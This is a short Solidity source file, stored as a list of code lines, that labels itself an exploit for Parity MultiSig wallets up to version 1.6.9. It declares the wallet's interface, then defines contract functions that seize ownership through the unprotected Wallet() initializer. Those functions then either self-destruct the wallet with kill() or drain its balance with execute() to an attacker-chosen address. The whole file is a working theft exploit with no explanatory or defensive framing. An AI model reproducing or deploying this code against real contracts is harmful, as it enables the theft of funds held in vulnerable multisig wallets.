['// nimrood, 2017-07-21\n', '// Parity MultiSig Wallet exploit up to 1.6.9\n', '//\n', 'pragma solidity ^0.4.13;\n', '\n', '// Parity Wallet methods\n', 'contract WalletAbi {\n', '\n', '  function kill(address _to);\n', '  function Wallet(address[] _owners, uint _required, uint _daylimit);\n', '  function execute(address _to, uint _value, bytes _data) returns (bytes32 o_hash);\n', '  \n', '}\n', '\n', '// Exploit a Parity MultiSig wallet\n', 'contract ExploitLibrary {\n', '    \n', '    // Take ownership of Parity Multisig Wallet\n', '    function takeOwnership(address _contract, address _to) public {\n', '        WalletAbi wallet = WalletAbi(_contract);\n', '        address[] newOwner;\n', '        newOwner.push(_to);\n', '        // Partiy multisig has a bug with Wallet()\n', '        wallet.Wallet(newOwner, 1, uint256(0-1));\n', '    }\n', '    \n', '    // Empty all funds by suicide\n', '    function killMultisig(address _contract, address _to) public {\n', '        takeOwnership(_contract, _to);\n', '        WalletAbi wallet = WalletAbi(_contract);\n', '        wallet.kill(_to);\n', '    }\n', '    \n', '    // Transfer funds from Multisig contract (_amount == 0 == all)\n', '    function transferMultisig(address _contract, address _to, uint _amount) public {\n', '        takeOwnership(_contract, _to);\n', '        uint amt = _amount;\n', '        WalletAbi wallet = WalletAbi(_contract);\n', '        if (wallet.balance < amt || amt == 0)\n', '            amt = wallet.balance;\n', '        wallet.execute(_to, amt, "");\n', '    }\n', '\n', '}']